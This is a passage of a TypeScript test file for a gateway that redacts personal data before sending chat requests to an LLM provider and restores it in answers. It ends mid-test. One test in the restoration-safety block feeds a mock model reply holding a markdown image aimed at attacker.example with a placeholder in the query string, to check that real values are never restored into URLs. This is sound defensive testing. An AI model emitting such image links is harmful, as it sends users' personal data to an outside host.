// POST /v1/chat/completions over HTTP (Fastify's inject), through the real
// Ollama adapter to a mock provider: what the provider receives, what the
// client gets back, and the error shapes. Leaks are the no-leak and canary
// tests' job; this file checks behaviour.
//
// Aadhaar values are generated in memory (ADR-009), and every comparison of
// text that embeds one goes through assertTextEqualQuietly. The published
// Visa test card and hand-written placeholders may be compared directly.

import { afterEach, describe, expect, it } from 'vitest';
import { PLACEHOLDER_INSTRUCTION } from '../../src/gateway/instruction.js';
import { createRng } from '../../src/synthetic/rng.js';
import { aadhaar, groupDigits } from '../../src/synthetic/values.js';
import {
  chatBody,
  post,
  readStreamed,
  startTestGateway,
  TEST_MODEL,
  type TestGateway,
} from '../support/gateway.js';
import {
  completionBody,
  echoLastUserMessage,
  okCompletion,
  ollamaStreamEvents,
  sseData,
  STREAM_ID,
  STREAM_USAGE,
  streamChunk,
  streamed,
  type Responder,
  SUCCESS_DEADLINE_MS,
} from '../support/mock-provider.js';
import { assertTextEqualQuietly } from '../support/quiet-text.js';

const rng = createRng(3_003);
const CARD = '4111 1111 1111 1111';

let gateway: TestGateway;
afterEach(async () => {
  await gateway?.close();
});

interface Completion {
  id: string;
  object: string;
  created: number;
  model: string;
  choices: { index: number; message: { role: string; content: string }; finish_reason: string }[];
  usage?: unknown;
}

interface SentBody {
  model: string;
  messages: { role: string; content: string }[];
  stream: boolean;
  stream_options?: unknown;
  stop?: string[];
  [key: string]: unknown;
}

const sentBodies = (g: TestGateway): SentBody[] =>
  g.provider.requests.map((r) => JSON.parse(r.body) as SentBody);

const answer = (body: string): string =>
  (JSON.parse(body) as Completion).choices[0]!.message.content;

const replyWith =
  (content: string, extra: Record<string, unknown> = {}): Responder =>
  (_req, res) => {
    res.writeHead(200, { 'content-type': 'application/json' });
    res.end(completionBody(content, extra));
  };

describe('round trip over HTTP', () => {
  it('redacts before sending and restores in the answer', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(okCompletion('Refund issued to card [CARD_1] for [EMAIL_1].'));
    const response = await post(
      gateway,
      chatBody(`My card ${CARD} was charged twice. Email me at asha@example.org.`),
    );
    expect(response.statusCode).toBe(200);
    expect(sentBodies(gateway)[0]!.messages).toEqual([
      { role: 'user', content: 'My card [CARD_1] was charged twice. Email me at [EMAIL_1].' },
    ]);
    expect(answer(response.body)).toBe(`Refund issued to card ${CARD} for asha@example.org.`);
  });

  it('returns only the allowlisted response fields, in OpenAI shape', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(
      replyWith('Hi.', {
        reasoning: 'thinking about [CARD_1]',
        timings: { a: 1 },
        _debug_info: {},
      }),
    );
    const response = await post(gateway, chatBody('Hello'));
    const body = JSON.parse(response.body) as Completion & Record<string, unknown>;
    expect(Object.keys(body).sort()).toEqual(
      ['choices', 'created', 'id', 'model', 'object', 'usage'].sort(),
    );
    expect(body).toMatchObject({
      id: 'chatcmpl-test',
      object: 'chat.completion',
      created: 1_790_000_000,
      model: TEST_MODEL,
      choices: [
        {
          index: 0,
          message: { role: 'assistant', content: 'Hi.', refusal: null },
          finish_reason: 'stop',
        },
      ],
      usage: { prompt_tokens: 10, completion_tokens: 5, total_tokens: 15 },
    });
    // `refusal` is on every message, null when there is none, as OpenAI's
    // specification requires (ADR-041 section 15, the refusal: null ruling).
    expect(Object.keys(body.choices[0]!.message).sort()).toEqual(['content', 'refusal', 'role']);
  });

  it('omits usage when the provider sends none', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith((_req, res) => {
      const body = JSON.parse(completionBody('Hi.')) as Record<string, unknown>;
      delete body.usage;
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify(body));
    });
    const response = await post(gateway, chatBody('Hello'));
    expect(response.statusCode).toBe(200);
    expect(JSON.parse(response.body)).not.toHaveProperty('usage');
  });

  it('passes finish_reason "length" through and leaves a truncated placeholder alone', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith((_req, res) => {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(
        completionBody('Your card is [CA').replace(
          '"finish_reason":"stop"',
          '"finish_reason":"length"',
        ),
      );
    });
    const response = await post(gateway, chatBody(`Card ${CARD}`));
    expect(answer(response.body)).toBe('Your card is [CA');
    expect((JSON.parse(response.body) as Completion).choices[0]!.finish_reason).toBe('length');
  });

  it('text parts are joined with a space and sent as one string; a card split across parts is still one card', async () => {
    gateway = await startTestGateway();
    const response = await post(gateway, {
      model: TEST_MODEL,
      messages: [
        {
          role: 'user',
          content: [
            { type: 'text', text: 'My card is 4111 1111' },
            { type: 'text', text: '1111 1111 thanks' },
          ],
        },
      ],
    });
    expect(response.statusCode).toBe(200);
    expect(sentBodies(gateway)[0]!.messages[0]!.content).toBe('My card is [CARD_1] thanks');
  });

  it('redacts stop sequences with the same mapping, after the messages', async () => {
    gateway = await startTestGateway();
    await post(gateway, {
      ...chatBody(`Card ${CARD}`),
      stop: ['asha@example.org', `End of ${CARD}`],
    });
    const sent = sentBodies(gateway)[0]!;
    expect(sent.stop).toEqual(['[EMAIL_1]', 'End of [CARD_1]']);
    await post(gateway, { ...chatBody('hi'), stop: 'STOP' });
    expect(sentBodies(gateway)[1]!.stop).toEqual(['STOP']);
  });

  it('forwards the sampling settings, maps max_completion_tokens to max_tokens, and drops user and safety_identifier', async () => {
    gateway = await startTestGateway();
    await post(gateway, {
      ...chatBody('hi'),
      temperature: 0.2,
      top_p: 0.9,
      max_completion_tokens: 50,
      seed: 7,
      frequency_penalty: 0.1,
      presence_penalty: -0.1,
      reasoning_effort: 'low',
      response_format: { type: 'json_object' },
      n: 1,
      logprobs: false,
      user: 'asha@example.org',
      safety_identifier: 'user-123',
    });
    const sent = sentBodies(gateway)[0]!;
    expect(sent).toEqual({
      model: TEST_MODEL,
      messages: [{ role: 'user', content: 'hi' }],
      stream: false,
      temperature: 0.2,
      top_p: 0.9,
      max_tokens: 50,
      seed: 7,
      frequency_penalty: 0.1,
      presence_penalty: -0.1,
      reasoning_effort: 'low',
      response_format: { type: 'json_object' },
    });
  });

  it('treats null settings as absent', async () => {
    gateway = await startTestGateway();
    const response = await post(gateway, {
      ...chatBody('hi'),
      temperature: null,
      stop: null,
      user: null,
      tools: null,
      stream: null,
    });
    expect(response.statusCode).toBe(200);
    expect(sentBodies(gateway)[0]).toEqual({
      model: TEST_MODEL,
      messages: [{ role: 'user', content: 'hi' }],
      stream: false,
    });
  });

  it('sends the configured model, and only the headers the adapter sets', async () => {
    gateway = await startTestGateway({ apiKey: 'provider-key' });
    await post(gateway, chatBody('hi'), {
      authorization: 'Bearer client-key',
      'x-custom': 'value',
      'openai-organization': 'org',
    });
    const sent = gateway.provider.requests[0]!;
    expect(sent.method).toBe('POST');
    expect(sent.url).toBe('/v1/chat/completions');
    expect(sent.headers.authorization).toBe('Bearer provider-key');
    expect(sent.headers['x-custom']).toBeUndefined();
    expect(sent.headers['openai-organization']).toBeUndefined();
  });
});

describe('over a real socket', () => {
  it('a normal request completes and its provider call is not aborted', async () => {
    gateway = await startTestGateway();
    let upstreamClosedEarly = false;
    gateway.provider.respondWith((request, response) => {
      response.on('close', () => {
        if (!response.writableFinished) upstreamClosedEarly = true;
      });
      okCompletion('Done.')(request, response);
    });
    const address = await gateway.app.listen({ port: 0, host: '127.0.0.1' });
    const response = await fetch(`${address}/v1/chat/completions`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(chatBody(`Card ${CARD}`)),
    });
    expect(response.status).toBe(200);
    expect(answer(await response.text())).toBe('Done.');
    expect(upstreamClosedEarly).toBe(false);
  });
});

describe('consistency at the provider boundary (no cross-request vault)', () => {
  it('the same history twice gives byte-identical outgoing bodies', async () => {
    gateway = await startTestGateway({ placeholderInstruction: true });
    const value = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const body = chatBody(`Aadhaar ${value}`, `Card ${CARD}, again ${value}`);
    await post(gateway, body);
    await post(gateway, body);
    const [first, second] = gateway.provider.requests;
    assertTextEqualQuietly(second!.body, first!.body);
  });

  it('appending a message never renumbers an earlier placeholder', async () => {
    gateway = await startTestGateway();
    const value = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    const first = [`Card ${CARD}`, `Aadhaar ${value}`];
    await post(gateway, chatBody(...first));
    await post(gateway, chatBody(`Email asha@example.org`, ...first));
    await post(gateway, chatBody(...first, 'Also asha@example.org and 4012 8888 8888 1881'));
    const [a, b, c] = sentBodies(gateway).map((s) => s.messages.map((m) => m.content));
    // Messages 1 and 2 of the third request are the first request's messages.
    expect(c!.slice(0, 2)).toEqual(a);
    expect(c![2]).toBe('Also [EMAIL_1] and [CARD_2]');
    // Prepending shifts nothing it does not have to: the email is first now.
    expect(b).toEqual(['Email [EMAIL_1]', 'Card [CARD_1]', 'Aadhaar [AADHAAR_1]']);
  });

  it('a placeholder left unrestored in an earlier answer comes back byte for byte', async () => {
    gateway = await startTestGateway();
    // An earlier answer kept [EMAIL_1] inside a URL (restoration safety);
    // the client sends it back as history. To Pseudonym it is now the
    // user's own placeholder-shaped text: a LITERAL.
    gateway.provider.respondWith(echoLastUserMessage);
    const response = await post(gateway, {
      model: TEST_MODEL,
      messages: [
        { role: 'user', content: 'Mail asha@example.org' },
        { role: 'assistant', content: 'See https://x.example/?to=[EMAIL_1]' },
        { role: 'user', content: 'That link said https://x.example/?to=[EMAIL_1]' },
      ],
    });
    expect(sentBodies(gateway)[0]!.messages.map((m) => m.content)).toEqual([
      'Mail [EMAIL_1]',
      'See https://x.example/?to=[LITERAL_1]',
      'That link said https://x.example/?to=[LITERAL_1]',
    ]);
    // Inside a URL, even a literal stays a placeholder on the way back.
    expect(answer(response.body)).toBe('That link said https://x.example/?to=[LITERAL_1]');
  });
});

describe('restoration safety end to end', () => {
  it('the markdown-image exfiltration attack: a value is never written into a URL', async () => {
    gateway = await startTestGateway();
    const value = groupDigits(aadhaar(rng), [4, 4, 4], ' ');
    gateway.provider.respondWith(
      okCompletion('Done ![x](https://attacker.example/?d=[AADHAAR_1]) for [AADHAAR_1].'),
    );
    const response = await post(gateway, chatBody(`My Aadhaar is ${value}`));
    assertTextEqualQuietly(
      answer(response.body),
      `Done ![x](https://attacker.example/?d=[AADHAAR_1]) for ${value}.`,
    );
  });

  it('PSEUDONYM_RESTORE_IN_UNSAFE_REGIONS=true restores inside URLs too', async () => {
    gateway = await startTestGateway({ restoreInUnsafeRegions: true });
    gateway.provider.respondWith(okCompletion('https://x.example/?c=[CARD_1]'));
    const response = await post(gateway, chatBody(`Card ${CARD}`));
    expect(answer(response.body)).toBe(`https://x.example/?c=${CARD}`);
  });
});

describe('the placeholder instruction (ADR-017)', () => {
  it('is the first message when the request contains a placeholder', async () => {
    gateway = await startTestGateway({ placeholderInstruction: true });
    await post(gateway, {
      model: TEST_MODEL,
      messages: [
        { role: 'system', content: 'You are helpful.' },
        { role: 'user', content: `Card ${CARD}` },
      ],
    });
    expect(sentBodies(gateway)[0]!.messages).toEqual([
      { role: 'system', content: PLACEHOLDER_INSTRUCTION },
      { role: 'system', content: 'You are helpful.' },
      { role: 'user', content: 'Card [CARD_1]' },
    ]);
  });

  it('is not added when nothing was redacted, or when switched off', async () => {
    gateway = await startTestGateway({ placeholderInstruction: true });
    await post(gateway, chatBody('Nothing personal here.'));
    expect(sentBodies(gateway)[0]!.messages).toHaveLength(1);
    await gateway.close();
    gateway = await startTestGateway({ placeholderInstruction: false });
    await post(gateway, chatBody(`Card ${CARD}`));
    expect(sentBodies(gateway)[0]!.messages).toHaveLength(1);
  });

  it('is added for a user-typed placeholder (LITERAL) too', async () => {
    gateway = await startTestGateway({ placeholderInstruction: true });
    await post(gateway, chatBody('What does [PAN_1] mean?'));
    expect(sentBodies(gateway)[0]!.messages[0]!.content).toBe(PLACEHOLDER_INSTRUCTION);
  });

  it('echoed back by the model, it comes out unchanged', async () => {
    gateway = await startTestGateway({ placeholderInstruction: true });
    gateway.provider.respondWith(okCompletion(PLACEHOLDER_INSTRUCTION));
    const response = await post(gateway, chatBody(`Card ${CARD}, email asha@example.org`));
    expect(answer(response.body)).toBe(PLACEHOLDER_INSTRUCTION);
  });
});

describe('request errors (OpenAI error shape)', () => {
  const errorOf = (body: string) => JSON.parse(body) as { error: Record<string, unknown> };

  it('stream_options without stream: true is rejected with a clear 400 and nothing is sent', async () => {
    gateway = await startTestGateway();
    const response = await post(gateway, {
      ...chatBody('hi'),
      stream_options: { include_usage: true },
    });
    expect(response.statusCode).toBe(400);
    expect(errorOf(response.body)).toEqual({
      error: {
        message: 'stream_options is only allowed when stream is true',
        type: 'invalid_request_error',
        param: null,
        code: 'invalid_request',
      },
    });
    expect(gateway.provider.requests).toHaveLength(0);
  });

  it('a model other than the configured one is rejected, without echoing it', async () => {
    gateway = await startTestGateway();
    const response = await post(gateway, { ...chatBody('hi'), model: 'gpt-4o' });
    expect(response.statusCode).toBe(400);
    expect(errorOf(response.body).error.code).toBe('model_not_found');
    expect(response.body).not.toContain('gpt-4o');
    expect(gateway.provider.requests).toHaveLength(0);
  });

  it('too many distinct values of one type → 422 with a fixed message', async () => {
    gateway = await startTestGateway();
    const many = Array.from({ length: 10_000 }, (_, i) => `u${i}@example.com`).join(' ');
    const response = await post(gateway, chatBody(many));
    expect(response.statusCode).toBe(422);
    expect(errorOf(response.body)).toEqual({
      error: {
        message: 'too many distinct values of one type in one request',
        type: 'invalid_request_error',
        param: null,
        code: 'too_many_values',
      },
    });
  });

  it.each([
    ['application/json', 200],
    ['application/json; charset=utf-8', 200],
    ['Application/JSON; Charset=UTF-8', 200],
    ['text/plain', 415],
    ['application/x-www-form-urlencoded', 415],
    ['multipart/form-data; boundary=x', 415],
  ])('content type %s → %i', async (contentType, status) => {
    gateway = await startTestGateway();
    const response = await post(gateway, chatBody('hi'), { 'content-type': contentType });
    expect(response.statusCode).toBe(status);
    if (status === 415) expect(errorOf(response.body).error.code).toBe('unsupported_media_type');
  });

  it('a missing content type → 415', async () => {
    gateway = await startTestGateway();
    const response = await gateway.app.inject({
      method: 'POST',
      url: '/v1/chat/completions',
      payload: Buffer.from(JSON.stringify(chatBody('hi'))),
    });
    expect(response.statusCode).toBe(415);
  });

  it('a body over the limit → 413, naming the limit', async () => {
    gateway = await startTestGateway({ bodyLimit: 1_000 });
    const response = await post(gateway, chatBody('x'.repeat(2_000)));
    expect(response.statusCode).toBe(413);
    expect(errorOf(response.body).error).toMatchObject({
      code: 'body_too_large',
      message: 'request body is larger than 1000 bytes',
    });
  });

  it.each([
    ['invalid JSON', '{"model": ', 'invalid_json'],
    ['an empty body', '', 'invalid_json'],
    ['a JSON array', '[]', 'invalid_request'],
    ['a __proto__ key', '{"__proto__": {"x": 1}}', 'invalid_json'],
  ])('%s → 400', async (_name, payload, code) => {
    gateway = await startTestGateway();
    const response = await post(gateway, payload);
    expect(response.statusCode).toBe(400);
    expect(errorOf(response.body).error.code).toBe(code);
  });

  it.each([
    ['GET', '/v1/chat/completions'],
    ['POST', '/v1/completions'],
    ['GET', '/v1/models'],
    ['POST', '/v1/embeddings'],
  ])('%s %s → 404 without echoing the URL', async (method, url) => {
    gateway = await startTestGateway();
    const response = await gateway.app.inject({ method: method as 'GET', url: `${url}?q=secret` });
    expect(response.statusCode).toBe(404);
    expect(errorOf(response.body).error).toMatchObject({
      type: 'not_found_error',
      code: 'not_found',
    });
    expect(response.body).not.toContain('secret');
  });
});

describe('provider failures', () => {
  // 400 left this table for 4b (ADR-041 sections 13 and 15): its own block
  // below.
  it.each([
    [404, 502, 'provider_error'],
    [500, 502, 'provider_error'],
    [503, 502, 'provider_error'],
  ])(
    'provider status %i → %i %s, the provider body never forwarded',
    async (upstream, status, code) => {
      gateway = await startTestGateway();
      gateway.provider.respondWith((_req, res) => {
        res.writeHead(upstream, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ error: { message: 'upstream said something' } }));
      });
      const response = await post(gateway, chatBody('hi'));
      expect(response.statusCode).toBe(status);
      const error = (JSON.parse(response.body) as { error: Record<string, unknown> }).error;
      expect(error).toMatchObject({ type: 'api_error', code });
      expect(error.message).toBe(`the provider returned an error (status ${upstream})`);
      expect(response.body).not.toContain('upstream said');
    },
  );

  // ADR-041 section 15, decision 2 (2c): moved out of the table above,
  // where a 429 was a 502 provider_error like any other status.
  it('provider status 429 → 503 provider_rate_limited with Retry-After, the provider body never forwarded', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith((_req, res) => {
      res.writeHead(429, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ error: { message: 'upstream said something' } }));
    });
    const response = await post(gateway, chatBody('hi'));
    expect(response.statusCode).toBe(503);
    expect(response.headers['retry-after']).toBe('30');
    const error = (JSON.parse(response.body) as { error: Record<string, unknown> }).error;
    expect(error).toEqual({
      message: 'the provider is limiting requests; try again later',
      type: 'api_error',
      param: null,
      code: 'provider_rate_limited',
    });
    expect(response.body).not.toContain('upstream said');
  });

  it('a provider timeout → 504', async () => {
    gateway = await startTestGateway({ timeoutMs: 100 });
    gateway.provider.respondWith(() => undefined);
    const response = await post(gateway, chatBody('hi'));
    expect(response.statusCode).toBe(504);
  });
});

// Option 4b (ADR-041 sections 13, 15 and 16, decision F): any provider HTTP
// 400 is a 400 to the client, its body never read, logged at warn with the
// provider's name. Until 4b this was a 502 provider_error.
describe('a provider 400 (4b)', () => {
  const rejected = {
    message: 'the provider rejected the request',
    type: 'invalid_request_error',
    param: null,
    code: 'provider_rejected_request',
  };
  const answer400 =
    (body: string): Responder =>
    (_req, res) => {
      res.writeHead(400, { 'content-type': 'application/json' });
      res.end(body);
    };
  const warnLines = (g: TestGateway): Record<string, unknown>[] =>
    g.logs
      .map((line) => JSON.parse(line) as Record<string, unknown>)
      .filter((entry) => entry.msg === 'provider rejected the request');

  it('not streamed: a 400 with a fixed body, the provider body never forwarded', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(answer400('{"error":{"message":"upstream said something"}}'));
    const response = await post(gateway, chatBody('hi'));
    expect(response.statusCode).toBe(400);
    expect(response.headers['retry-after']).toBeUndefined();
    expect((JSON.parse(response.body) as { error: unknown }).error).toEqual(rejected);
    expect(response.body).not.toContain('upstream said');
  });

  it('streamed: the same 400, before any event (a provider 400 comes before the first chunk)', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(answer400('{"error":{"message":"upstream said something"}}'));
    const response = await post(gateway, { ...chatBody('hi'), stream: true });
    expect(response.statusCode).toBe(400);
    expect(response.headers['content-type']).toMatch(/^application\/json/);
    expect((JSON.parse(response.body) as { error: unknown }).error).toEqual(rejected);
  });

  it("logged once at warn, with the provider's name and the status, nothing of either body", async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(answer400('{"error":{"message":"upstream said something"}}'));
    await post(gateway, chatBody('Card 4111 1111 1111 1111'));
    const lines = warnLines(gateway);
    expect(lines).toHaveLength(1);
    expect(lines[0]).toMatchObject({
      level: 40,
      provider: 'ollama',
      statusCode: 400,
      error: { name: 'ProviderError', failure: 'http', status: 400 },
    });
    const all = gateway.logs.join('');
    expect(all).not.toContain('upstream said');
    expect(all).not.toContain('4111');
    expect(gateway.logs.join('')).not.toContain('"msg":"request rejected"');
  });

  // The breaking change ADR-041 section 16 (F) records: Ollama answers a
  // request over its context with HTTP 400 (bug-log 55, Ollama 0.35.1).
  // That was a 502 until 4b; it is a 400 now. Through the Ollama adapter.
  it("Ollama's over-context answer (HTTP 400) → 400, no longer 502", async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(
      answer400(
        '{"error":{"message":"the input length exceeds the context length","type":"invalid_request_error"}}',
      ),
    );
    const response = await post(gateway, chatBody('a long request'));
    expect(response.statusCode).toBe(400);
    expect((JSON.parse(response.body) as { error: { code: string } }).error.code).toBe(
      'provider_rejected_request',
    );
  });
});

describe('logging', () => {
  it('logs only method, route pattern, status, timing and request id', async () => {
    gateway = await startTestGateway();
    await post(gateway, chatBody(`Card ${CARD}`));
    await gateway.app.inject({ method: 'GET', url: '/v1/other?q=1' });
    const lines = gateway.logs.map((l) => JSON.parse(l) as Record<string, unknown>);
    expect(lines.length).toBeGreaterThanOrEqual(4);
    const allowed = new Set([
      'level',
      'time',
      'pid',
      'hostname',
      'reqId',
      'req',
      'res',
      'responseTime',
      'msg',
    ]);
    for (const line of lines) {
      expect(Object.keys(line).filter((k) => !allowed.has(k))).toEqual([]);
      if (line.req) expect(Object.keys(line.req as object).sort()).toEqual(['method', 'route']);
      if (line.res) expect(Object.keys(line.res as object)).toEqual(['statusCode']);
    }
    expect(
      lines.map((l) => (l.req as { route?: string } | undefined)?.route).filter(Boolean),
    ).toEqual(['/v1/chat/completions', 'unmatched']);
  });

  it('logs a rejected request at info and a failed one at error, with safe details only', async () => {
    gateway = await startTestGateway();
    await post(gateway, { ...chatBody('hi'), tools: [] });
    gateway.provider.respondWith((_req, res) => {
      res.writeHead(500);
      res.end();
    });
    await post(gateway, chatBody('hi'));
    const lines = gateway.logs.map((l) => JSON.parse(l) as Record<string, unknown>);
    const rejected = lines.find((l) => l.msg === 'request rejected')!;
    expect(rejected).toMatchObject({
      level: 30,
      statusCode: 400,
      error: { name: 'GatewayError', code: 'unsupported_feature' },
    });
    const failed = lines.find((l) => l.msg === 'request failed')!;
    expect(failed).toMatchObject({
      level: 50,
      statusCode: 502,
      error: { name: 'ProviderError', failure: 'http', status: 500 },
    });
  });
});

describe('streaming (ADR-019)', () => {
  const streamBody = (...messages: string[]): Record<string, unknown> => ({
    ...chatBody(...messages),
    stream: true,
  });

  it('redacts before sending, and streams the answer back restored, as server-sent events', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(
      streamed(ollamaStreamEvents(['Refund issued to card [CA', 'RD_1] for ', '[EMAIL_1].'])),
    );
    const response = await post(
      gateway,
      streamBody(`My card ${CARD} was charged twice. Email me at asha@example.org.`),
    );
    expect(response.statusCode).toBe(200);
    expect(response.headers['content-type']).toBe('text/event-stream; charset=utf-8');
    expect(response.headers['cache-control']).toBe('no-cache');
    const sent = sentBodies(gateway)[0]!;
    expect(sent.stream).toBe(true);
    expect(sent.stream_options).toBeUndefined();
    expect(sent.messages).toEqual([
      { role: 'user', content: 'My card [CARD_1] was charged twice. Email me at [EMAIL_1].' },
    ]);
    const streamedAnswer = readStreamed(response.body);
    expect(streamedAnswer.content).toBe(`Refund issued to card ${CARD} for asha@example.org.`);
    expect(streamedAnswer.done).toBe(true);
    expect(streamedAnswer.error).toBeUndefined();
    expect(new Set(streamedAnswer.chunks.map((c) => c.model))).toEqual(new Set([TEST_MODEL]));
    expect(new Set(streamedAnswer.chunks.map((c) => c.id))).toEqual(new Set([STREAM_ID]));
  });

  it('gives the same answer as the non-streaming path for the same provider text', async () => {
    const text = 'Card [CARD_1], mail [EMAIL_1], ![x](https://a.example/?d=[EMAIL_1]) CARD_1.x';
    const request = `Card ${CARD}, mail asha@example.org`;
    gateway = await startTestGateway();
    gateway.provider.respondWith(okCompletion(text));
    const whole = answer((await post(gateway, chatBody(request))).body);
    gateway.provider.respondWith(streamed(ollamaStreamEvents([...text].map((ch) => ch))));
    const pieces = readStreamed((await post(gateway, streamBody(request))).body).content;
    expect(pieces).toBe(whole);
    expect(whole).toContain('?d=[EMAIL_1]');
  });

  it('include_usage: forwarded to the provider, and the usage chunk comes last', async () => {
    gateway = await startTestGateway();
    gateway.provider.respondWith(streamed(ollamaStreamEvents(['ok'], { usage: true })));
    const response = await post(gateway, {
      ...streamBody('hi'),
      stream_options: { include_usage: true },
    });
    expect(sentBodies(gateway)[0]!.stream_options).toEqual({ include_usage: true });
    const { chunks, done } = readStreamed(response.body);
    expect(chunks.at(-1)).toMatchObject({ choices: [], usage: STREAM_USAGE });
    expect(chunks.slice(0, -1).every((c) => c.usage === null)).toBe(true);
    expect(done).toBe(true);
  });

  // Bug-log 75: usage on any chunk is taken, the last one wins, and counts
  // that go down are logged once at warn, never a failure.
  describe('usage counts that go down (bug 75)', () => {
    const counts = (prompt: number, completion: number, total: number) => ({
      prompt_tokens: prompt,
      completion_tokens: completion,
      total_tokens: total,
    });
    const pieceWithUsage = (content: string, usage: ReturnType<typeof counts>): string =>
      sseData(streamChunk([{ index: 0, delta: { content }, finish_reason: null }], { usage }));
    const finish = sseData(streamChunk([{ index: 0, delta: {}, finish_reason: 'stop' }]));
    const DONE = sseData('[DONE]');
    const WARN = 'provider usage counts decreased';
    const warnLines = (g: TestGateway): Record<string, unknown>[] =>
      g.logs
        .map((line) => JSON.parse(line) as Record<string, unknown>)
        .filter((line) => line.msg === WARN);

    it('the stream still succeeds with the last usage; one warn line, the provider and the counts by name, nothing else', async () => {
      gateway = await startTestGateway();
      gateway.provider.respondWith(
        streamed([
          pieceWithUsage('Refund to ', counts(20, 3, 23)),
          pieceWithUsage('[CARD_1]', counts(20, 1, 21)),
          pieceWithUsage('.', counts(20, 2, 22)),
          finish,
          DONE,
        ]),
      );
      const response = await post(gateway, {
        ...streamBody(`Card ${CARD}`),
        stream_options: { include_usage: true },
      });
      expect(response.statusCode).toBe(200);
      const result = readStreamed(response.body);
      expect(result.done).toBe(true);
      expect(result.error).toBeUndefined();
      expect(result.content).toBe(`Refund to ${CARD}.`);
      expect(result.chunks.at(-1)).toMatchObject({ choices: [], usage: counts(20, 2, 22) });
      const lines = warnLines(gateway);
      expect(lines).toHaveLength(1);
      // Completion went 3 → 1 and total 23 → 21; the prompt never moved. The
      // names only: the values would weakly track the length of the input.
      expect(lines[0]).toMatchObject({
        level: 40,
        provider: 'ollama',
        decreased: ['completion', 'total'],
      });
      expect(Object.keys(lines[0]!).sort()).toEqual(
        ['decreased', 'hostname', 'level', 'msg', 'pid', 'provider', 'reqId', 'time'].sort(),
      );
      const all = gateway.logs.join('');
      expect(all).not.toContain('4111');
      expect(all).not.toContain('Refund');
      expect(all).not.toContain('CARD_1');
    });

    it('logged once however many times the counts go down', async () => {
      gateway = await startTestGateway();
      gateway.provider.respondWith(
        streamed([
          pieceWithUsage('a', counts(9, 5, 14)),
          pieceWithUsage('b', counts(8, 4, 12)),
          pieceWithUsage('c', counts(7, 3, 10)),
          finish,
          DONE,
        ]),
      );
      const response = await post(gateway, {
        ...streamBody('hi'),
        stream_options: { include_usage: true },
      });
      expect(readStreamed(response.body).done).toBe(true);
      const lines = warnLines(gateway);
      expect(lines).toHaveLength(1);
      expect(lines[0]!.decreased).toEqual(['prompt', 'completion', 'total']);
    });

    it('also when the client did not ask for usage: no usage sent, still one warn line', async () => {
      gateway = await startTestGateway();
      gateway.provider.respondWith(
        streamed([
          pieceWithUsage('a', counts(9, 5, 14)),
          pieceWithUsage('b', counts(9, 4, 13)),
          finish,
          DONE,
        ]),
      );
      const result = readStreamed((await post(gateway, streamBody('hi'))).body);
      expect(result.done).toBe(true);
      expect(result.chunks.every((c) => !('usage' in c))).toBe(true);
      const lines = warnLines(gateway);
      expect(lines).toHaveLength(1);
      expect(lines[0]!.decreased).toEqual(['completion', 'total']);
    });

    it('counts that never go down: no warn line', async () => {
      gateway = await startTestGateway();
      gateway.provider.respondWith(
        streamed([
          pieceWithUsage('a', counts(9, 1, 10)),
          pieceWithUsage('b', counts(9, 1, 10)),
          finish,
          DONE,
        ]),
      );
      const response = await post(gateway, {
        ...streamBody('hi'),
        stream_options: { include_usage: true },
      });
      expect(readStreamed(response.body).done).toBe(true);
      expect(warnLines(gateway)).toEqual([]);
    });
  });

  it.each<[string, Responder, number, string, number?]>([
    [
      'provider status 500 → 502',
      (_req, res) => {
        res.writeHead(500, { 'content-type': 'application/json' });
        res.end(JSON.stringify({ error: { message: 'upstream said something' } }));
      },
      502,
      'provider_error',
    ],
    [
      'a 200 that is not an event stream → 502',
      (_req, res) => {
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(completionBody('not a stream'));
      },
      502,
      'provider_bad_response',
    ],
    ['no first chunk in time → 504', streamed([], { end: false }), 504, 'provider_timeout', 150],
  ])(
    'a failure before the first chunk is an ordinary HTTP error: %s',
    async (_name, responder, status, code, timeoutMs) => {
      gateway = await startTestGateway(timeoutMs === undefined ? {} : { timeoutMs });
      gateway.provider.respondWith(responder);
      const response = await post(gateway, streamBody('hi'));
      expect(response.statusCode).toBe(status);
      expect(response.headers['content-type']).toMatch(/^application\/json/);
      expect((JSON.parse(response.body) as { error: { code: string } }).error.code).toBe(code);
      expect(response.body).not.toContain('upstream said');
    },
  );

  it.each<[string, (string | Uint8Array)[], string, string]>([
    [
      'the stream is cut off without [DONE]',
      ollamaStreamEvents(['Refund to [CARD_1]']).slice(0, 1),
      'provider_bad_response',
      'the provider returned an unusable response',
    ],
    [
      'the provider sends an error event',
      [
        ...ollamaStreamEvents(['Refund to [CARD_1]']).slice(0, 1),
        sseData({ error: { message: 'upstream said something' } }),
      ],
      'provider_error',
      'the provider reported an error during the stream',
    ],
  ])(
    'a failure after the start: held text flushed, then an error event (%s)',
    async (_name, parts, code, message) => {
      gateway = await startTestGateway();
      gateway.provider.respondWith(streamed(parts));
      const response = await post(gateway, streamBody(`Card ${CARD}`));
      expect(response.statusCode).toBe(200);
      const result = readStreamed(response.body);
      expect(result.content).toBe(`Refund to ${CARD}`);
      expect(result.error).toEqual({ error: { message, type: 'api_error', param: null, code } });
      expect(result.done).toBe(false);
      expect(response.body).not.toContain('upstream said');
      const lines = gateway.logs.map((l) => JSON.parse(l) as Record<string, unknown>);
      expect(lines.find((l) => l.msg === 'stream failed')).toMatchObject({
        level: 50,
        code,
        error: { name: 'ProviderError' },
      });
    },
  );

  it('a gap between chunks longer than the timeout → provider_timeout error event', async () => {
    gateway = await startTestGateway({ timeoutMs: SUCCESS_DEADLINE_MS });
    gateway.provider.respondWith(
      streamed(ollamaStreamEvents(['partial answer']).slice(0, 1), { end: false }),
